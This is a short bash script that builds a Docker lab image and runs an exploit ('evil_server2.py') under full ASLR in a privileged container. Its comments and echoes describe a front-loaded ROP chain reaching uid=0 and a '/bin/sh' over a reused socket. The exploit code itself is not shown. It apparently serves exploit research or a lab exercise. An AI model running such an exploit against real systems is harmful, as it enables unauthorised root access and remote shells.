#!/usr/bin/env bash
# One-click: build the lab image, then run the front-load exploit under FULL
# ASLR. No offset finding needed — RIP is sourced from the response front.
# On Apple Silicon: `colima start --arch x86_64` first.
set -euo pipefail
cd "$(dirname "$0")"

IMAGE=front-load-stager
echo "[*] building lab image ..."
docker build --platform=linux/amd64 -t "$IMAGE" .

echo "[*] running exploit under full ASLR ..."
docker run --rm --platform=linux/amd64 --privileged -e ANGROP "$IMAGE" bash -lc '
  set -e
  echo 2 > /proc/sys/kernel/randomize_va_space
  echo "[*] randomize_va_space = $(cat /proc/sys/kernel/randomize_va_space)"
  cd /work
  echo "[*] === MODE=marker (front-loaded chain -> uid=0) ==="
  ANGROP=${ANGROP:-0} MODE=marker python3 exploit/evil_server2.py
  echo "[*] === MODE=shell (real /bin/sh over the reused socket) ==="
  ANGROP=${ANGROP:-0} MODE=shell python3 exploit/evil_server2.py
  echo "[*] both modes passed."
'
